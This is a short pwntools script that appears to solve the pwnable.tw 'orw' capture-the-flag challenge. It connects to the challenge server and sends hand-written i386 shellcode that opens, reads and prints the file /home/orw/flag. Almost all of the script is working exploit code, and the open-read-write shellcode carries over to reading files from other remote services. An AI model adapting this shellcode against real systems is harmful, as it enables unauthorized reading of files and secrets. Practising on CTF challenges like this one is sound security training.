#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

ip = "chall.pwnable.tw"
port = 10001
r = remote(ip,port)

context.arch = 'i386'

shellcode = asm('''
open:
xor ecx, ecx
xor edx, edx
push 0x6761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx, esp
mov eax, 5
int 0x80
read:
mov ebx, eax
mov ecx, esp
mov edx, 0x100
mov eax, 3
int 0x80
write:
mov edx, eax
mov eax, 4
mov ebx, 1
int 0x80
''')
# /home/orw/flag  =>  0x2f686f6d 652f6f72 772f666c 6167
r.sendline(shellcode)
r.interactive()
